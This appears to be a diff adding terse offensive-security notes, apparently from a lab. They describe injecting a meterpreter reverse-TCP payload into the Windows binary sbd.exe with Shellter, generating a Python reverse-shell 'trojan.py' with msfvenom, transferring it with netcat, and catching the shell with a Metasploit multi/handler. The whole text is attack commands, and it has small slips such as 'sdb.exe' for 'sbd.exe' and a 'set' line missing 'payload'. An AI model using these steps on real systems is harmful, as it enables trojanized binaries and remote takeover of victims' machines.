@@ -1,0 +1,16 @@
+cd /usr/share/windows-binaries
+ls -l
+Copy sdb.exe Shellter
+PE Target: sbd.exe
+Choose L for "listed". 
+Then, select 1 for the "meterpreter_reverse_tcp" payload.
+msfconsole
+use the multi-handler
+set payload windows/meterpreter/reverse_tcp
+
+msfvenom -p python/meterpreter/reverse_tcp LHOST=<local IP> LPORT=<port> > trojan.py
+nc -l -p 6666 > trojan.py
+nc 10.0.2.53 6666 < trojan.py
+use multi/handler
+set python/meterpreter/reverse_tcp
+exploit or run
